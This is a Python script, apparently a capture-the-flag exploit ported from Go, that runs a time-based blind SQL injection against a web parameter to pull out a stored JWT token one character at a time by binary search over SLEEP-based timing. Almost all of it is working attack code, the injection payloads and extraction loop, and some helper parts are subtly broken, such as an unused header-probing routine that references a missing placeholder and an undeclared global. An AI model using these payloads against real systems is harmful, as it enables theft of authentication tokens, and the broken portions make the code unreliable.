#!/usr/bin/env python3
# Ported from Go to Python3 by @DarkMatterMatt
import requests
import time

TARGET = "http://localhost/?id=2&jwt=$payload$"
total_requests = 0

# payload must sleep if  JWT_Char < $char$
# 1 AND (select CAST(jwt AS BINARY) rlike $check$)
#PAYLOAD = "1/**/AND/**/(select/**/CAST(jwt/**/AS/**/BINARY)/**/rlike/**/$check$)"
PAYLOAD = "' OR SUBSTR(jwt, $index$ %2B 1, 1) >= '$char$' OR SLEEP(0.1) OR '"
REGEX_PAYLOAD = "1/**/AND/**/(select/**/CAST(jwt/**/AS/**/BINARY)/**/RLIKE/**/$regex$)"
SUCCESS_TIME = 0.1

def create_tree(arr, start, end):
    if start > end:
        return []

    mid = start + (end - start) // 2
    root = arr[mid]
    left = create_tree(arr, start, mid - 1)
    right = create_tree(arr, mid + 1, end)

    return [root, *left, *right]


def create_tree2(arr):
    # end of branch
    if len(arr) == 1:
        return (arr[0],)

    # find the middle index, and element
    mid = len(arr) // 2
    root = arr[mid]

    # create the tree recursively
    return root, create_tree2(arr[:mid]), create_tree2(arr[mid:])


def test_payload(payload):
    target = TARGET.replace("$payload$", payload)

    # time query
    start_time = time.time()
    requests.get(target)
    elapsed_time = time.time() - start_time

    global total_requests
    total_requests += 1

    return elapsed_time > SUCCESS_TIME

def test_regex(regex):
    payload = REGEX_PAYLOAD.replace("$regex$", regex)
    return test_payload(payload)

def test_char(index, char):
    #print(char)
    payload = PAYLOAD.replace("$index$", str(index)).replace("$char$", char)
    return test_payload(payload)

def query_char(index, tree):
    if len(tree) == 1:
        # maybe double check char here?
        return tree[0]
    
    current_char, lower, higher = tree
    slept = test_char(index, current_char)

    return query_char(index, lower if slept else higher)

def check_arr(arr, char=None):
    for i, elem in enumerate(arr):
        target = TARGET + PAYLOAD.replace("$check$", elem)
        if char is not None:
            target = target.replace("$iterate$", str(char))

        total_requests += 1

        start = time.time()
        response = requests.get(target)
        elapsed = time.time() - start

        if elapsed > 1:
            return i
        # if len(response.text) > 30:
        #	 return i

    return 0


def get_header():
    headers = {
        # I+I|M|U
        "IUzI": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.",
        "IUzM": "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.",
        "IUzU": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.",

        # S+I|M|U
        "SUzI": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.",
        "SUzM": "eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.",
        "SUzU": "eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.",

        # F+I|M|U
        "FUzI": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.",
        "FUzM": "eyJhbGciOiJFUzM4NCIsInR5cCI6IkpXVCIsImtpZCI6ImlUcVhYSTB6YkFuSkNLRGFvYmZoa00xZi02ck1TcFRmeVpNUnBfMnRLSTgifQ.",
        "FUzU": "eyJhbGciOiJFUzUxMiIsInR5cCI6IkpXVCIsImtpZCI6InhaRGZacHJ5NFA5dlpQWnlHMmZOQlJqLTdMejVvbVZkbTd0SG9DZ1NOZlkifQ.",

        # Q+I|M
        "QUzI": "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.",
        "QUzM": "eyJhbGciOiJQUzM4NCIsInR5cCI6IkpXVCJ9.",
    }

    check_algo_array = [
        "\"^.{11}[I]\"",
        "\"^.{11}[S]\"",
        "\"^.{11}[F]\"",
        "\"^.{11}[Q]\"",
    ]
    check_algo_array_inner = [
        "\"^.{14}[I]\"",
        "\"^.{14}[M]\"",
        "\"^.{14}[U]\"",
    ]

    # step 1, check header
    flag = check_arr(check_algo_array)
    header = check_arr(check_algo_array_inner)

    if flag == 0:
        if header == 0:
            return headers["IUzI"]
        if header == 1:
            return headers["IUzM"]
        if header == 2:
            return headers["IUzU"]

    if flag == 1:
        if header == 0:
            return headers["SUzI"]
        if header == 1:
            return headers["SUzM"]
        if header == 2:
            return headers["SUzU"]

    if flag == 2:
        if header == 0:
            return headers["FUzI"]
        if header == 1:
            return headers["FUzM"]
        if header == 2:
            return headers["FUzU"]

    if flag == 3:
        if header == 0:
            return headers["QUzI"]
        if header == 1:
            return headers["QUzM"]


def main():
    print("[+] Retriving JWT Tokens.....")
    print("[+] ")

    charset = "_-/+=.0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    charset = [""] + list(charset)
    print(charset)
    tree = create_tree2(charset)

    for i in range(155):
        char = query_char(i, tree)
        if char == "":
            break

        print(char, end="", flush=True)

    print("\n[+] Number of Requests:", total_requests)
    print("[+] Exfiltration Done!")


if __name__ == "__main__":
    main()
